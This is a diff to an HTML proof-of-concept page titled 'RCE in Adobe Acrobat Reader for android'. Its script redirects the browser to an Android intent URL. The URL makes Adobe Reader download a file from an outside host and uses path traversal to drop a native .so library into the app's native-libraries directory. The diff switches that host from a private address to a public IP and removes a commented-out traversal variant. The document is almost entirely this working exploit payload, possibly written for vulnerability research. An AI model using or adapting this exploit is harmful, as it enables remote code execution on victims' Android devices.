@@ -2,11 +2,8 @@
 	<title>RCE in Adobe Acrobat Reader for android</title>
 	<body>
 		<script>
-			// window.open(
-			// 	'./x/x/x/x/x/..%2F..%2F..%2F..%2F..%2Fdata%2Fapp%2Fcom.adobe.reader-axxy9Tzv9datqkyXw03I-Q==%2Flib%2Farm64%2Ffile.pdf'
-			// );
 			window.location.href =
-				'intent://192.168.126.132:8000/..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.adobe.reader%2Ffiles%2Fsplitcompat%2F1921819312%2Fnative-libraries%2FFASOpenCVDF.config.x86_64%2Flibopencv_info.so#Intent;scheme=http;type=application/*;package=com.adobe.reader;component=com.adobe.reader/.AdobeReader;end';
+				'intent://94.59.94.173:8000/..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.adobe.reader%2Ffiles%2Fsplitcompat%2F1921819312%2Fnative-libraries%2FFASOpenCVDF.config.arm64_v8a%2Flibopencv_info.so#Intent;scheme=http;type=application/*;package=com.adobe.reader;component=com.adobe.reader/.AdobeReader;end';
 		</script>
 	</body>
 </html>
